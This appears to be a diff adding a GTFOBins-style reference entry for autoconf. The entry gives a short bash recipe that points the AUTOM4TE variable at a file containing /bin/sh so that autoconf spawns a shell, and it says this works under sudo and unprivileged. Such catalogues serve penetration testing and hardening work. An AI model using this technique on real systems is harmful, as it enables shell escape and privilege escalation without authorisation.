@@ -1,0 +1,19 @@
+---
+type: gtfobin
+name: autoconf
+platform: Unix
+functions: [shell]
+tags: [gtfobin, unix, lotl]
+---
+
+# autoconf
+
+## shell
+
+```bash
+echo /bin/sh >/path/to/temp-file
+chmod +x /path/to/temp-file
+touch configure.ac
+AUTOM4TE=/path/to/temp-file autoconf
+```
+**Contexts:** sudo, unprivileged
